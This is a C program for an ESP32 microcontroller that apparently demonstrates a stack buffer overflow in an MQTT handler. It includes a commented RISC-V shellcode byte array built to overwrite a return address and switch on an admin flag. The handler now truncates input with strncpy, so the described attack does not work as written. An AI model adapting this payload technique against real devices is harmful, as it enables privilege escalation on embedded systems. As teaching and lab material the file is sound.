#include <stdio.h>
#include <inttypes.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_mac.h"

volatile char adminMode = 0;

void setAdminMode()
{
    adminMode = 1;
}

void vulnerableMQTTHandler(const char *message)
{
    char smallbuffer[48];
    // Use strncpy to prevent buffer overflow
    strncpy(smallbuffer, message, sizeof(smallbuffer) - 1);
    smallbuffer[sizeof(smallbuffer) - 1] = '\0'; // Null-terminate the string

    printf("Processed MQTT Message: %s\n", smallbuffer);
    if (strcmp(smallbuffer, "admin") == 0)
    {
        setAdminMode();
    }
    fflush(stdout);
}

// The attack modifies the content of this buffer to overwrite the return address
// and jump to the `setAdminMode` function, enabling admin privileges.
char buffer[80] = {
    0xb7, 0xd7, 0x80, 0x40, // load adminMode address
    0x05, 0x47,             // load 1 into a4
    0x23, 0x84, 0xe7, 0x4e, // set adminMode to 1
    0xb3, 0x80, 0x10, 0x40, // clear ra
    0x93, 0x80, 0x20, 0x04, // add 0x42 to ra
    0x93, 0x90, 0x80, 0x01, // shift ra left
    0x37, 0x0e, 0x88, 0xb7, // load return address
    0x13, 0x5e, 0x0e, 0x01, // shift t3 right
    0xb3, 0x80, 0xc0, 0x01, // add t3 to ra
    0x82, 0x80,             // jump to ra
    0x01, 0x01, 0x01, 0x01, // padding
    0x01, 0x01, 0x01, 0x01, // padding
    0x01, 0x01, 0x01, 0x01, // padding
    0x01, 0x01, 0x01, 0x01, // padding
    0x01, 0x01, 0x01, 0x01, // padding
    0x01, 0x01, 0x01, 0x01, // padding
    0x70, 0x04, 0x81, 0x40, // overwrite return address
    0x00                    // null terminator
};

void app_main(void)
{
    printf("Hello world!\n");
    for (;;)
    {
        vulnerableMQTTHandler(buffer);
        if (adminMode)
        {
            printf("ADMIN MODE!!!\n");
        }
        vTaskDelay(1000 / portTICK_PERIOD_MS);
    }
}
